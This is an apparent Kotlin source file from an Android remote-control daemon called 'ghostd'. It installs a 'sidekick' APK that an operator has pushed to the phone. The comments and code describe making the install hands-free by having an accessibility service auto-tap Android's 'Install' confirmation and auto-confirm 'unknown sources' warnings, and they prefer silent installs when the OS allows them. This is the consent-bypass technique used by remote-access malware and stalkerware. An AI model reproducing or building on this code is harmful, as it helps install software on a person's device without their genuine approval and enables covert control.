package com.tg.ghostd

import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import org.json.JSONObject
import java.io.File

/**
 * `sidekick install` — installs the ghosta (com.tg.ghosta) sidekick APK
 * that was previously pushed to the phone via `files put`.
 *
 * INSTALL FLOW (important):
 *   1. Operator pushes the APK:      files put /sdcard/Download/ghosta.apk
 *      (server streams it; FileReceiver writes + sha256-verifies it).
 *   2. Operator runs:                sidekick install [path]
 *   3. ghostd installs via PackageInstaller (REQUEST_INSTALL_PACKAGES is in
 *      the manifest). ghostd is NOT the installer-of-record for com.tg.ghosta
 *      on first install, so Android shows the system confirm dialog and the
 *      USER MUST TAP "Install" — the armed sidekick AUTO-TAPS it
 *      ("Install" is in GhostAccessibilityService.CONFIRM_TEXTS), so in
 *      practice it completes hands-free. If the OEM allows silent install
 *      (or on UPDATE of a sidekick ghostd installed before — then ghostd IS
 *      the installer-of-record and PackageInstaller goes silent), no dialog
 *      appears at all. Silent is preferred whenever the OS grants it; the
 *      confirm+auto-tap path is the reliable fallback.
 *   4. Result JSON tells the operator which flow to expect.
 *
 * The sidekick's armed state also auto-confirms any "app installed from
 * unknown sources" warnings that some OEMs add on top.
 */
object SidekickInstaller {

    /** Default files-put destination for the sidekick APK (shared storage). */
    const val DEFAULT_APK_PATH = "/sdcard/Download/ghosta.apk"

    fun install(ctx: Context, apkPath: String = DEFAULT_APK_PATH): JSONObject {
        val f = File(apkPath)
        if (!f.exists() || !f.isFile || f.length() == 0L) {
            throw Exception(
                "apk not found at $apkPath — push it first: files put $apkPath"
            )
        }
        // Maximize the hands-free path: make sure the sidekick is armed so it
        // auto-taps the system "Install" confirm dialog (fire-and-forget; if
        // the sidekick isn't installed yet this is a no-op and the user taps).
        try {
            SidekickLink.send(JSONObject().put("cmd", "arm"))
        } catch (_: Exception) {
        }

        val installer = ctx.packageManager.packageInstaller
        val params = PackageInstaller.SessionParams(
            PackageInstaller.SessionParams.MODE_FULL_INSTALL
        )
        val session = installer.openSession(installer.createSession(params))
        try {
            session.openWrite("ghosta", 0, f.length()).use { out ->
                f.inputStream().use { it.copyTo(out) }
            }
            // Status callback: system-delivered broadcast, explicitly targeted
            // at our package. Mutable so PackageInstaller can fill in status
            // extras (required to specify mutability on Android 12+).
            val status = PendingIntent.getBroadcast(
                ctx, 0,
                Intent("com.tg.ghostd.SIDEKICK_INSTALL_STATUS")
                    .setPackage(ctx.packageName),
                PendingIntent.FLAG_MUTABLE
            )
            session.commit(status.intentSender)
        } finally {
            session.close()
        }
        return JSONObject()
            .put("apk", f.absolutePath)
            .put("size", f.length())
            .put("status", "install_submitted")
            .put(
                "note",
                "confirm dialog expected on first install; armed sidekick auto-taps Install"
            )
    }
}
